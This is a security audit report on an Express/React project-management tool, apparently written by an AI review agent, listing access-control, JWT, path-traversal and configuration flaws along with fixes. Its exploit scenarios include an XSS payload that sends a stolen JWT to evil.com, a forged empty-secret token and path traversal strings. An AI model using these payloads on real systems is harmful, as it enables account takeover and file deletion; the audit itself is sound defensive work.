# Security Audit Report: Arena PM Tool

**Audit Date:** January 27, 2026
**Auditor:** Security Review Agent
**Codebase Version:** Commit 1fa2a05
**Severity Scale:** Critical > High > Medium > Low > Info

---

## A) Executive Summary

### Overall Risk Assessment: **HIGH**

This security audit of the Arena PM Tool revealed **18 security findings** across authentication, authorization, input handling, and infrastructure categories. The most critical issues involve:

1. **Broken Access Control (IDOR)** - Any authenticated user can modify/delete any task or category
2. **JWT Security Gaps** - Missing secret validation and tokens exposed to XSS via localStorage
3. **RLS Policies Ineffective** - Row Level Security exists but is completely bypassed by the Express backend
4. **Path Traversal Vulnerability** - In avatar deletion functionality
5. **Authentication Bypass** - Cron endpoint accessible without authentication when secret is not configured

### Top 5 Issues to Fix Immediately

| # | Finding | Severity | Impact |
|---|---------|----------|--------|
| 1 | IDOR in Task/Category Operations | **Critical** | Full data manipulation by any user |
| 2 | JWT Secret Not Validated | **Critical** | Token forgery possible |
| 3 | Path Traversal in Avatar Delete | **High** | Arbitrary file deletion |
| 4 | Token Stored in localStorage | **High** | XSS leads to full account takeover |
| 5 | Cron Endpoint Auth Bypass | **High** | Unauthorized job execution |

### Quick Stats

- **Critical:** 2
- **High:** 6
- **Medium:** 7
- **Low:** 3

---

## B) System Overview

### Technology Stack

| Layer | Technology | Version |
|-------|------------|---------|
| Frontend | React | 19.2.3 |
| State Management | Zustand | 5.0.10 |
| Backend | Express | 5.2.1 |
| Database | PostgreSQL | via pg 8.17.1 |
| Authentication | JWT | jsonwebtoken 9.0.3 |
| Password Hashing | bcryptjs | 3.0.3 |
| Deployment | Vercel Serverless | - |

### Entry Points

| Endpoint | Auth Required | Rate Limited | Description |
|----------|---------------|--------------|-------------|
| `POST /api/auth/register` | No | Yes (5/15min) | User registration |
| `POST /api/auth/login` | No | Yes (5/15min) | User login |
| `GET /api/auth/users` | Yes | Yes (100/15min) | List all users |
| `GET/POST/PUT/DELETE /api/tasks/*` | Yes | Yes (100/15min) | Task CRUD |
| `GET/POST/PUT/DELETE /api/categories/*` | Yes | Yes (100/15min) | Category CRUD |
| `POST /api/me/avatar` | Yes | Yes (100/15min) | File upload |
| `POST /api/reminders/trigger` | Conditional | No | Cron job trigger |
| `GET /api/health` | No | No | Health check |
| `GET /api/db-test` | No | No | Database connectivity |

### Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│                        Internet                                  │
└─────────────────┬───────────────────────────────────────────────┘
                  │ HTTPS
                  ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Vercel Edge / CDN                            │
│  - Static assets (React build)                                  │
│  - Rewrites /api/* to serverless function                       │
└─────────────────┬───────────────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────────────┐
│                Express Serverless Function                       │
│  - Helmet (security headers)                                    │
│  - CORS (configurable origins)                                  │
│  - Rate limiting                                                │
│  - JWT auth middleware                                          │
│  - Controllers (business logic)                                 │
└─────────────────┬───────────────────────────────────────────────┘
                  │ SSL (rejectUnauthorized: false ⚠️)
                  ▼
┌─────────────────────────────────────────────────────────────────┐
│                   PostgreSQL (Supabase)                         │
│  - RLS policies defined (but NOT enforced by Express!)          │
│  - Direct queries via pg pool                                   │
└─────────────────────────────────────────────────────────────────┘
```

### Data Stores

| Store | Type | Sensitivity | Notes |
|-------|------|-------------|-------|
| PostgreSQL | Primary DB | High | User credentials, task data |
| localStorage | Client | High | JWT token, user object |
| Cookies | Client | High | JWT token (httpOnly) |
| `/uploads/avatars/` | File system | Low | User avatars |

### Authentication Model

- **Method:** JWT tokens (7-day expiration)
- **Storage:** Both httpOnly cookie AND localStorage (dual storage is a security concern)
- **Password:** bcrypt with 10 salt rounds
- **Session:** Stateless JWT, no server-side session tracking
- **Roles:** `admin` (first user), `member` (subsequent users)

---

## C) Findings Table

### CRITICAL

---

#### C-1: Insecure Direct Object Reference (IDOR) in Task Operations

**Severity:** Critical
**Confidence:** High

**Evidence:**

File: `server/controllers/taskController.js:367-557`

```javascript
// Update task
const updateTask = async (req, res) => {
  try {
    const { id } = req.params;
    // ...

    // Check if task exists - NO OWNERSHIP CHECK!
    const checkResult = await query('SELECT * FROM tasks WHERE id = $1', [id]);
    if (checkResult.rows.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'Task not found'
      });
    }

    // Proceeds to update without verifying req.user.id owns or is assigned to the task
```

File: `server/controllers/taskController.js:638-677`

```javascript
// Delete task - same issue
const deleteTask = async (req, res) => {
  try {
    const { id } = req.params;

    // Check if task exists - NO OWNERSHIP CHECK!
    const checkResult = await query('SELECT * FROM tasks WHERE id = $1', [id]);
    // ... deletes without authorization check
```

**Impact:** Any authenticated user can:
- Read any task details
- Modify any task (title, description, status, assignees)
- Delete any task
- Reorder any task's position

**Exploit Scenario:**
1. User A creates a confidential task with sensitive information
2. User B (any authenticated user) sends `PUT /api/tasks/1` with modified data
3. User B can also send `DELETE /api/tasks/1` to delete User A's task
4. No audit trail, no authorization check

**Fix:**

```javascript
// In updateTask and deleteTask, add authorization check:
const updateTask = async (req, res) => {
  const { id } = req.params;

  const checkResult = await query(
    `SELECT t.*,
     EXISTS(SELECT 1 FROM task_assignments ta WHERE ta.task_id = t.id AND ta.user_id = $2) as is_assigned
     FROM tasks t WHERE t.id = $1`,
    [id, req.user.id]
  );

  if (checkResult.rows.length === 0) {
    return res.status(404).json({ status: 'error', message: 'Task not found' });
  }

  const task = checkResult.rows[0];
  const isAuthorized =
    task.created_by === req.user.id ||
    task.is_assigned ||
    req.user.role === 'admin';

  if (!isAuthorized) {
    return res.status(403).json({
      status: 'error',
      message: 'Not authorized to modify this task'
    });
  }

  // Continue with update...
};
```

**Tests to Verify Fix:**
```javascript
// Test: Non-owner cannot update task
const res = await request(app)
  .put('/api/tasks/1')
  .set('Authorization', `Bearer ${userBToken}`) // User B's token
  .send({ title: 'Hacked!' });
expect(res.status).toBe(403);

// Test: Creator can update
const res2 = await request(app)
  .put('/api/tasks/1')
  .set('Authorization', `Bearer ${userAToken}`) // Creator's token
  .send({ title: 'Updated' });
expect(res2.status).toBe(200);
```

---

#### C-2: JWT Secret Validation Missing

**Severity:** Critical
**Confidence:** High

**Evidence:**

File: `server/controllers/authController.js:9-15`

```javascript
// Generate JWT token
const generateToken = (userId, email, role) => {
  return jwt.sign(
    { userId, email, role },
    process.env.JWT_SECRET,  // No validation that this exists or is strong!
    { expiresIn: '7d' }
  );
};
```

File: `server/middleware/auth.js:29`

```javascript
const decoded = jwt.verify(token, process.env.JWT_SECRET);
// If JWT_SECRET is undefined, jwt.verify will use empty string
```

**Impact:**
- If `JWT_SECRET` is not set, tokens are signed with an empty string or `undefined`
- Attacker can forge valid JWT tokens
- Complete authentication bypass

**Exploit Scenario:**
1. Developer forgets to set `JWT_SECRET` in production
2. Attacker generates JWT: `jwt.sign({userId: 1, role: 'admin'}, '')`
3. Attacker has full admin access to the system

**Fix:**

```javascript
// In server/server.js, add at startup:
const validateEnvironment = () => {
  const required = ['JWT_SECRET', 'DATABASE_URL'];
  const missing = required.filter(key => !process.env[key]);

  if (missing.length > 0) {
    console.error(`FATAL: Missing required environment variables: ${missing.join(', ')}`);
    process.exit(1);
  }

  // Validate JWT_SECRET strength
  if (process.env.JWT_SECRET.length < 32) {
    console.error('FATAL: JWT_SECRET must be at least 32 characters');
    process.exit(1);
  }
};

// Call before app setup
validateEnvironment();
```

```javascript
// In authController.js:
const generateToken = (userId, email, role) => {
  const secret = process.env.JWT_SECRET;
  if (!secret || secret.length < 32) {
    throw new Error('JWT_SECRET is not configured properly');
  }

  return jwt.sign(
    { userId, email, role },
    secret,
    {
      expiresIn: '7d',
      algorithm: 'HS256'  // Explicitly specify algorithm
    }
  );
};
```

**Tests:**
```javascript
describe('JWT Security', () => {
  it('should reject tokens signed with empty secret', async () => {
    const fakeToken = jwt.sign({ userId: 1 }, '');
    const res = await request(app)
      .get('/api/auth/me')
      .set('Authorization', `Bearer ${fakeToken}`);
    expect(res.status).toBe(401);
  });
});
```

---

### HIGH

---

#### H-1: Path Traversal in Avatar Deletion

**Severity:** High
**Confidence:** High

**Evidence:**

File: `server/controllers/meController.js:346-383`

```javascript
const deleteAvatar = async (req, res) => {
  try {
    // Get the current avatar to delete it
    const currentUser = await query(
      'SELECT avatar_url FROM users WHERE id = $1',
      [req.user.id]
    );

    if (currentUser.rows.length > 0 && currentUser.rows[0].avatar_url) {
      // Delete avatar file - VULNERABLE TO PATH TRAVERSAL
      const avatarPath = path.join(__dirname, '..', currentUser.rows[0].avatar_url);
      if (fs.existsSync(avatarPath)) {
        fs.unlinkSync(avatarPath);  // Deletes the file!
      }
    }
```

**Impact:**
- If attacker can set `avatar_url` to `/../../../etc/passwd` (via SQL injection or other means)
- Or if there's a race condition during upload where path is manipulated
- Arbitrary file deletion on the server

**Exploit Scenario:**
1. Attacker manipulates avatar_url in database (if they find another vulnerability)
2. Sets `avatar_url` to `/../../../app/server.js`
3. Calls `DELETE /api/me/avatar`
4. Critical server files are deleted

**Fix:**

```javascript
const deleteAvatar = async (req, res) => {
  try {
    const currentUser = await query(
      'SELECT avatar_url FROM users WHERE id = $1',
      [req.user.id]
    );

    if (currentUser.rows.length > 0 && currentUser.rows[0].avatar_url) {
      const avatarUrl = currentUser.rows[0].avatar_url;

      // Validate the path is within uploads directory
      const uploadsDir = path.resolve(__dirname, '..', 'uploads', 'avatars');
      const avatarPath = path.resolve(__dirname, '..', avatarUrl);

      // Security check: ensure path is within allowed directory
      if (!avatarPath.startsWith(uploadsDir)) {
        console.error('Path traversal attempt detected:', avatarUrl);
        return res.status(400).json({
          status: 'error',
          message: 'Invalid avatar path'
        });
      }

      if (fs.existsSync(avatarPath)) {
        fs.unlinkSync(avatarPath);
      }
    }
```

---

#### H-2: JWT Token Stored in localStorage (XSS Risk)

**Severity:** High
**Confidence:** High

**Evidence:**

File: `client/src/store/authStore.js:20-22`

```javascript
// Store in localStorage - VULNERABLE TO XSS
localStorage.setItem('user', JSON.stringify(user));
localStorage.setItem('token', token);
```

File: `server/controllers/authController.js:96-108`

```javascript
// Return user data (without password)
res.status(201).json({
  status: 'success',
  message: 'User registered successfully',
  data: {
    user: { /* ... */ },
    token  // Token in response body!
  }
});
```

**Impact:**
- Any XSS vulnerability allows attacker to steal JWT tokens
- `localStorage.getItem('token')` is accessible to any JavaScript
- Token in response body can be logged/intercepted

**Exploit Scenario:**
1. Attacker finds XSS in task description (see H-4)
2. Injects: `<script>fetch('https://evil.com/steal?t='+localStorage.token)</script>`
3. Victim views the task
4. Attacker receives victim's JWT token
5. Full account takeover for 7 days (token lifetime)

**Fix:**

Remove token from response body and rely solely on httpOnly cookies:

```javascript
// authController.js - Remove token from response
res.status(201).json({
  status: 'success',
  message: 'User registered successfully',
  data: {
    user: {
      id: newUser.id,
      email: newUser.email,
      name: newUser.name,
      role: newUser.role
    }
    // DO NOT include token here
  }
});

// The httpOnly cookie is already set, which is the secure method
```

```javascript
// client/src/store/authStore.js - Remove localStorage token storage
const response = await authAPI.login(credentials);
const { user } = response.data.data;

// Only store non-sensitive user info for UI purposes
localStorage.setItem('user', JSON.stringify({
  id: user.id,
  name: user.name,
  role: user.role
  // Do NOT store token!
}));
```

```javascript
// client/src/utils/api.js - Remove token from header, rely on cookies
api.interceptors.request.use(
  (config) => {
    // Remove the Authorization header logic
    // Cookies are sent automatically with withCredentials: true
    return config;
  }
);
```

---

#### H-3: Cron Endpoint Authentication Bypass

**Severity:** High
**Confidence:** High

**Evidence:**

File: `server/routes/reminders.js:11-25`

```javascript
router.post('/trigger', async (req, res) => {
  // Verify the request is from Vercel Cron (in production)
  if (process.env.VERCEL) {
    const cronSecret = process.env.CRON_SECRET;
    if (cronSecret) {  // Only checks if cronSecret is set!
      const authHeader = req.headers.authorization;
      if (authHeader !== `Bearer ${cronSecret}`) {
        return res.status(401).json({
          status: 'error',
          message: 'Unauthorized - Invalid cron secret'
        });
      }
    }
    // If CRON_SECRET is not set, request is allowed through!
  }
  // Not on Vercel? No auth check at all!
```

**Impact:**
- If `CRON_SECRET` is not configured, anyone can trigger the reminder job
- Non-Vercel environments have no authentication at all
- Can be used for denial of service (spam emails)

**Exploit Scenario:**
1. Attacker discovers `/api/reminders/trigger` endpoint
2. In non-Vercel deployment, no auth required
3. Sends POST requests repeatedly
4. Triggers mass email sends, potentially burning email quotas

**Fix:**

```javascript
router.post('/trigger', async (req, res) => {
  // ALWAYS require authentication for this endpoint
  const cronSecret = process.env.CRON_SECRET;

  if (!cronSecret) {
    console.error('CRON_SECRET not configured - endpoint disabled');
    return res.status(503).json({
      status: 'error',
      message: 'Reminder service not configured'
    });
  }

  const authHeader = req.headers.authorization;
  if (authHeader !== `Bearer ${cronSecret}`) {
    return res.status(401).json({
      status: 'error',
      message: 'Unauthorized'
    });
  }

  // Proceed with job...
});
```

---

#### H-4: IDOR in Category Operations

**Severity:** High
**Confidence:** High

**Evidence:**

File: `server/controllers/categoryController.js:169-267`

```javascript
// Update category - NO OWNERSHIP CHECK
const updateCategory = async (req, res) => {
  const { id } = req.params;

  // Check if category exists
  const checkResult = await query('SELECT * FROM categories WHERE id = $1', [id]);
  // No check if req.user.id === created_by!
```

Same issue exists in `deleteCategory`.

**Impact:** Any authenticated user can modify or delete any category.

**Fix:** Add ownership verification:

```javascript
const updateCategory = async (req, res) => {
  const { id } = req.params;

  const checkResult = await query('SELECT * FROM categories WHERE id = $1', [id]);
  if (checkResult.rows.length === 0) {
    return res.status(404).json({ status: 'error', message: 'Category not found' });
  }

  const category = checkResult.rows[0];
  if (category.created_by !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({
      status: 'error',
      message: 'Not authorized to modify this category'
    });
  }
  // Continue...
};
```

---

#### H-5: Weak Password Policy

**Severity:** High
**Confidence:** High

**Evidence:**

File: `server/controllers/authController.js:39-45`

```javascript
// Validate password length
if (password.length < 6) {
  return res.status(400).json({
    status: 'error',
    message: 'Password must be at least 6 characters long.'
  });
}
// No complexity requirements!
```

**Impact:**
- "123456" is a valid password
- Highly susceptible to dictionary attacks
- Rate limiting (5/15min) helps but doesn't prevent slow attacks

**Fix:**

```javascript
const validatePassword = (password) => {
  const errors = [];

  if (password.length < 12) {
    errors.push('Password must be at least 12 characters');
  }
  if (!/[A-Z]/.test(password)) {
    errors.push('Password must contain at least one uppercase letter');
  }
  if (!/[a-z]/.test(password)) {
    errors.push('Password must contain at least one lowercase letter');
  }
  if (!/[0-9]/.test(password)) {
    errors.push('Password must contain at least one number');
  }
  if (!/[^A-Za-z0-9]/.test(password)) {
    errors.push('Password must contain at least one special character');
  }

  // Check against common passwords
  const commonPasswords = ['password123', 'admin123', '12345678', 'qwerty123'];
  if (commonPasswords.some(cp => password.toLowerCase().includes(cp))) {
    errors.push('Password is too common');
  }

  return errors;
};

// In register:
const passwordErrors = validatePassword(password);
if (passwordErrors.length > 0) {
  return res.status(400).json({
    status: 'error',
    message: 'Password does not meet requirements',
    errors: passwordErrors
  });
}
```

---

#### H-6: SSL Certificate Verification Disabled

**Severity:** High
**Confidence:** High

**Evidence:**

File: `server/config/database.js:22-26`

```javascript
// Enable SSL for production databases (Supabase, Railway, RDS, etc.)
if (process.env.DB_SSL === 'true') {
  poolConfig.ssl = {
    rejectUnauthorized: false // Required for most managed databases - INSECURE!
  };
}
```

**Impact:**
- Man-in-the-middle attacks possible
- Database credentials can be intercepted
- Data in transit is not verified

**Fix:**

```javascript
if (process.env.DB_SSL === 'true') {
  poolConfig.ssl = {
    rejectUnauthorized: process.env.NODE_ENV === 'production',
    // For production, provide the CA certificate
    ca: process.env.DB_CA_CERT || undefined
  };
}
```

For Supabase specifically, use their provided CA certificate.

---

### MEDIUM

---

#### M-1: RLS Policies Not Enforced by Express Backend

**Severity:** Medium
**Confidence:** High

**Evidence:**

The RLS policies in `supabase/migrations/20240102000000_rls_policies.sql` define access controls, but they require setting the session variable `app.current_user_id`:

```sql
-- From RLS policies
CREATE OR REPLACE FUNCTION current_user_id()
RETURNS INTEGER AS $$
  -- Fall back to custom session variable
  custom_uid := current_setting('app.current_user_id', true);
```

However, the Express backend never sets this variable:

File: `server/config/database.js:50-58`

```javascript
const query = async (text, params) => {
  try {
    const result = await pool.query(text, params);
    // No SET LOCAL app.current_user_id = ?
    return result;
  }
```

**Impact:**
- All RLS policies are bypassed
- The security boundaries defined in RLS are completely ineffective
- Creates false sense of security

**Fix:**

```javascript
// In database.js, create a user-scoped query function:
const queryAsUser = async (text, params, userId) => {
  const client = await pool.connect();
  try {
    await client.query('SET LOCAL app.current_user_id = $1', [userId]);
    const result = await client.query(text, params);
    return result;
  } finally {
    client.release();
  }
};

// In controllers, use:
const result = await queryAsUser(queryText, params, req.user.id);
```

---

#### M-2: Error Messages Expose Internal Details

**Severity:** Medium
**Confidence:** High

**Evidence:**

File: `server/controllers/authController.js:110-117`

```javascript
} catch (error) {
  console.error('Registration error:', error);
  res.status(500).json({
    status: 'error',
    message: 'Error registering user',
    error: error.message  // Exposes internal error message!
  });
}
```

This pattern is repeated in all controllers.

**Impact:**
- Leaks database schema information
- Reveals internal paths and configurations
- Aids attackers in crafting exploits

**Fix:**

```javascript
// Create error handler middleware
const errorHandler = (err, req, res, next) => {
  console.error('Error:', err);

  // Log full error for debugging
  if (process.env.NODE_ENV === 'development') {
    return res.status(500).json({
      status: 'error',
      message: err.message,
      stack: err.stack
    });
  }

  // Production: generic message
  return res.status(500).json({
    status: 'error',
    message: 'An unexpected error occurred'
  });
};

// In controllers:
} catch (error) {
  next(error);  // Let middleware handle it
}
```

---

#### M-3: Account Enumeration via Registration

**Severity:** Medium
**Confidence:** High

**Evidence:**

File: `server/controllers/authController.js:53-58`

```javascript
if (existingUser.rows.length > 0) {
  return res.status(400).json({
    status: 'error',
    message: 'User with this email already exists.'  // Reveals email exists!
  });
}
```

**Impact:**
- Attacker can enumerate valid email addresses
- Facilitates targeted phishing attacks
- Aids in credential stuffing attacks

**Fix:**

```javascript
// Use identical responses whether user exists or not
// During registration, send confirmation email instead of immediate feedback

// Or use timing-safe comparison:
const existingUser = await query('SELECT id FROM users WHERE email = $1', [email.toLowerCase()]);

// Add artificial delay to prevent timing attacks
await new Promise(resolve => setTimeout(resolve, 100 + Math.random() * 100));

if (existingUser.rows.length > 0) {
  // Log attempt but return generic message
  console.warn(`Registration attempt for existing email: ${email}`);
  return res.status(400).json({
    status: 'error',
    message: 'Unable to create account. Please check your information.'
  });
}
```

---

#### M-4: Missing Content Security Policy in Development

**Severity:** Medium
**Confidence:** High

**Evidence:**

File: `server/server.js:62-64`

```javascript
} else {
  helmetConfig.contentSecurityPolicy = false;  // CSP disabled in development
}
```

**Impact:**
- XSS vulnerabilities easier to exploit during development
- Developers may not notice XSS issues until production
- Development environment is less secure

**Fix:**

```javascript
// Apply CSP in all environments, just with less restrictions in dev
const cspDirectives = {
  defaultSrc: ["'self'"],
  styleSrc: ["'self'", "'unsafe-inline'"],
  scriptSrc: ["'self'"],
  imgSrc: ["'self'", 'data:', 'blob:'],
  connectSrc: ["'self'"],
  fontSrc: ["'self'"],
  objectSrc: ["'none'"],
  frameSrc: ["'none'"]
};

if (process.env.NODE_ENV !== 'production') {
  // Allow localhost connections in development
  cspDirectives.connectSrc.push('http://localhost:*', 'ws://localhost:*');
  cspDirectives.scriptSrc.push("'unsafe-eval'"); // For hot reload
}

helmetConfig.contentSecurityPolicy = { directives: cspDirectives };
```

---

#### M-5: File Upload MIME Type Validation Bypass

**Severity:** Medium
**Confidence:** Medium

**Evidence:**

File: `server/routes/me.js:32-39`

```javascript
const fileFilter = (req, file, cb) => {
  const allowedTypes = ['image/jpeg', 'image/png', 'image/webp'];
  if (allowedTypes.includes(file.mimetype)) {  // Only checks MIME type!
    cb(null, true);
  } else {
    cb(new Error('Invalid file type...'), false);
  }
};
```

**Impact:**
- MIME type can be spoofed by setting Content-Type header
- Malicious files could be uploaded with image extension
- Potential for stored XSS if files are served with wrong Content-Type

**Fix:**

```javascript
const fileFilter = (req, file, cb) => {
  const allowedTypes = ['image/jpeg', 'image/png', 'image/webp'];
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.webp'];

  // Check MIME type
  if (!allowedTypes.includes(file.mimetype)) {
    return cb(new Error('Invalid file type'), false);
  }

  // Check extension
  const ext = path.extname(file.originalname).toLowerCase();
  if (!allowedExtensions.includes(ext)) {
    return cb(new Error('Invalid file extension'), false);
  }

  cb(null, true);
};

// Also add magic number verification after upload:
const validateImageMagicNumber = (filePath) => {
  const buffer = fs.readFileSync(filePath, { length: 8 });

  // JPEG: FF D8 FF
  if (buffer[0] === 0xFF && buffer[1] === 0xD8 && buffer[2] === 0xFF) return true;

  // PNG: 89 50 4E 47 0D 0A 1A 0A
  if (buffer[0] === 0x89 && buffer[1] === 0x50 && buffer[2] === 0x4E && buffer[3] === 0x47) return true;

  // WebP: 52 49 46 46 ... 57 45 42 50
  if (buffer[0] === 0x52 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x46) return true;

  return false;
};
```

---

#### M-6: Static Files Served Without Authentication

**Severity:** Medium
**Confidence:** High

**Evidence:**

File: `server/server.js:130`

```javascript
// Serve static files for uploads (avatars, etc.)
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
// No authentication middleware!
```

**Impact:**
- Anyone can access uploaded avatars without authentication
- User avatars may be considered private
- Allows enumeration of user IDs through avatar filenames

**Fix:**

```javascript
// Option 1: Require authentication for all uploads
app.use('/uploads', authMiddleware, express.static(path.join(__dirname, 'uploads')));

// Option 2: Use signed URLs or tokens
app.get('/uploads/avatars/:filename', async (req, res) => {
  const { filename } = req.params;

  // Verify the requester has access
  const token = req.query.token;
  if (!verifyAccessToken(token, filename)) {
    return res.status(403).send('Forbidden');
  }

  res.sendFile(path.join(__dirname, 'uploads', 'avatars', filename));
});
```

---

#### M-7: Missing CSRF Protection

**Severity:** Medium
**Confidence:** Medium

**Evidence:**

While `SameSite=strict` cookies provide some protection, there's no explicit CSRF token implementation:

File: `server/controllers/authController.js:88-93`

```javascript
res.cookie('token', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000
});
```

**Impact:**
- `SameSite=strict` may not be supported in all browsers
- State-changing requests could be forged in some scenarios
- No defense in depth

**Fix:**

```javascript
// Add CSRF token generation
const crypto = require('crypto');

const generateCsrfToken = () => crypto.randomBytes(32).toString('hex');

// In login response, set CSRF token
res.cookie('csrfToken', generateCsrfToken(), {
  httpOnly: false,  // Needs to be readable by JS
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict'
});

// Add CSRF middleware for state-changing requests
const csrfMiddleware = (req, res, next) => {
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
    const headerToken = req.headers['x-csrf-token'];
    const cookieToken = req.cookies.csrfToken;

    if (!headerToken || headerToken !== cookieToken) {
      return res.status(403).json({ status: 'error', message: 'Invalid CSRF token' });
    }
  }
  next();
};
```

---

### LOW

---

#### L-1: Debug Endpoint Exposed

**Severity:** Low
**Confidence:** High

**Evidence:**

File: `server/server.js:172-187`

```javascript
// Database test route - should not be in production
app.get('/api/db-test', async (req, res) => {
  try {
    const result = await pool.query('SELECT NOW() as current_time, version() as postgres_version');
    res.json({
      status: 'OK',
      message: 'Database connection successful',
      data: result.rows[0]  // Exposes PostgreSQL version!
    });
```

**Impact:**
- Exposes database version to attackers
- Can be used for targeted attacks based on known PostgreSQL vulnerabilities
- No rate limiting on this endpoint

**Fix:**

```javascript
// Remove or protect the endpoint in production
if (process.env.NODE_ENV !== 'production') {
  app.get('/api/db-test', async (req, res) => {
    // ...
  });
}

// Or require admin authentication
app.get('/api/db-test', authMiddleware, adminMiddleware, async (req, res) => {
  // ...
});
```

---

#### L-2: Verbose Health Endpoint

**Severity:** Low
**Confidence:** High

**Evidence:**

File: `server/server.js:160-165`

```javascript
// Check if critical env vars are set (without exposing values)
health.config = {
  database_url: !!process.env.DATABASE_URL,
  jwt_secret: !!process.env.JWT_SECRET,
  allowed_origins: !!process.env.ALLOWED_ORIGINS
};
```

**Impact:**
- Reveals which environment variables are configured
- Helps attackers understand system configuration
- Information disclosure

**Fix:**

Remove config information from health endpoint or require authentication:

```javascript
app.get('/api/health', async (req, res) => {
  const health = {
    status: 'OK',
    timestamp: new Date().toISOString()
  };

  // Only include detailed info for authenticated admin requests
  if (req.headers.authorization && req.user?.role === 'admin') {
    health.config = {
      database_url: !!process.env.DATABASE_URL,
      // ...
    };
  }

  res.json(health);
});
```

---

#### L-3: Missing Audit Logging

**Severity:** Low
**Confidence:** High

**Evidence:**

No audit logging for security-relevant events:
- User login/logout
- Failed login attempts
- Permission changes
- Data modifications
- Admin actions

**Impact:**
- Cannot detect or investigate security incidents
- No forensic trail
- Compliance issues (GDPR, SOC2, etc.)

**Fix:**

```javascript
// Create audit logger
const auditLog = async (event) => {
  await query(
    `INSERT INTO audit_logs (user_id, action, resource_type, resource_id, details, ip_address, user_agent, created_at)
     VALUES ($1, $2, $3, $4, $5, $6, $7, NOW())`,
    [
      event.userId,
      event.action,
      event.resourceType,
      event.resourceId,
      JSON.stringify(event.details),
      event.ipAddress,
      event.userAgent
    ]
  );
};

// Usage in controllers:
await auditLog({
  userId: req.user.id,
  action: 'DELETE_TASK',
  resourceType: 'task',
  resourceId: id,
  details: { previousTitle: task.title },
  ipAddress: req.ip,
  userAgent: req.headers['user-agent']
});
```

---

## D) Quick Wins (< 1 day each)

| # | Fix | Effort | Impact |
|---|-----|--------|--------|
| 1 | Add ownership checks to task/category controllers | 2-3 hours | Critical |
| 2 | Validate JWT_SECRET at startup | 30 min | Critical |
| 3 | Add path traversal protection to avatar delete | 1 hour | High |
| 4 | Remove token from response body | 1 hour | High |
| 5 | Require CRON_SECRET authentication always | 30 min | High |
| 6 | Remove `error.message` from production responses | 1 hour | Medium |
| 7 | Disable/protect `/api/db-test` endpoint | 15 min | Low |
| 8 | Add password complexity requirements | 1-2 hours | High |

---

## E) Hardening Recommendations

### Security Headers (Already Mostly Good)

Current Helmet configuration is reasonable. Additional recommendations:

```javascript
// Add to helmet config
helmetConfig.permittedCrossDomainPolicies = { permittedPolicies: 'none' };
helmetConfig.expectCt = { maxAge: 86400, enforce: true };
```

### Rate Limiting Improvements

```javascript
// Add IP-based account lockout
const loginAttempts = new Map();

const trackLoginAttempt = (ip, success) => {
  const attempts = loginAttempts.get(ip) || { count: 0, lastAttempt: Date.now() };

  if (success) {
    loginAttempts.delete(ip);
  } else {
    attempts.count++;
    attempts.lastAttempt = Date.now();
    loginAttempts.set(ip, attempts);
  }
};

const isIpBlocked = (ip) => {
  const attempts = loginAttempts.get(ip);
  if (!attempts) return false;

  // Block after 10 failed attempts for 1 hour
  if (attempts.count >= 10 && Date.now() - attempts.lastAttempt < 3600000) {
    return true;
  }

  return false;
};
```

### Secrets Management

1. Use environment-specific secrets (different for dev/staging/prod)
2. Rotate JWT_SECRET periodically
3. Use a secrets manager (AWS Secrets Manager, HashiCorp Vault)
4. Never log secrets, even accidentally

### Monitoring & Alerting

1. Alert on multiple failed login attempts
2. Alert on unusual API patterns
3. Monitor for SQL injection attempts in logs
4. Track rate limit hits

---

## F) Automated Security Checks

### Recommended CI/CD Pipeline Additions

```yaml
# .github/workflows/security.yml
name: Security Checks

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Dependency vulnerability scanning
      - name: Run npm audit
        run: |
          cd server && npm audit --audit-level=high
          cd ../client && npm audit --audit-level=high

      # Secret scanning
      - name: GitLeaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # SAST scanning
      - name: CodeQL
        uses: github/codeql-action/analyze@v3
        with:
          languages: javascript

      # Dependency license check
      - name: License Checker
        run: npx license-checker --failOn "GPL;AGPL"
```

### Pre-commit Hooks

```json
// package.json
{
  "husky": {
    "hooks": {
      "pre-commit": "npm run lint && npm run security:check"
    }
  },
  "scripts": {
    "security:check": "npm audit --audit-level=high && npx gitleaks detect --source=. --no-git"
  }
}
```

### Tools to Add

| Tool | Purpose | Integration Point |
|------|---------|-------------------|
| npm audit | Dependency vulnerabilities | CI + pre-commit |
| GitLeaks | Secret detection | CI + pre-commit |
| CodeQL | SAST scanning | GitHub Actions |
| OWASP ZAP | DAST scanning | Staging deploys |
| Snyk | Dependency + container scanning | CI |

---

## Appendix: Files Reviewed

### Backend (server/)
- `server.js` - Main Express app
- `middleware/auth.js` - JWT authentication
- `middleware/rateLimiter.js` - Rate limiting config
- `controllers/authController.js` - Authentication logic
- `controllers/taskController.js` - Task CRUD
- `controllers/categoryController.js` - Category CRUD
- `controllers/commentController.js` - Comment CRUD
- `controllers/meController.js` - User profile
- `controllers/holidayController.js` - Holiday API proxy
- `routes/*.js` - All route definitions
- `config/database.js` - PostgreSQL config
- `config/supabase.js` - Supabase client
- `config/schema.sql` - Database schema
- `utils/emailService.js` - Email sending
- `utils/reminderService.js` - Reminder logic
- `jobs/reminderJob.js` - Cron job

### Frontend (client/)
- `src/store/authStore.js` - Auth state management
- `src/utils/api.js` - API client configuration
- `package.json` - Dependencies

### Infrastructure
- `vercel.json` - Deployment config
- `.gitignore` files - Secret exclusion
- `.env.example` files - Environment templates
- `supabase/migrations/*.sql` - RLS policies

---

*End of Security Audit Report*
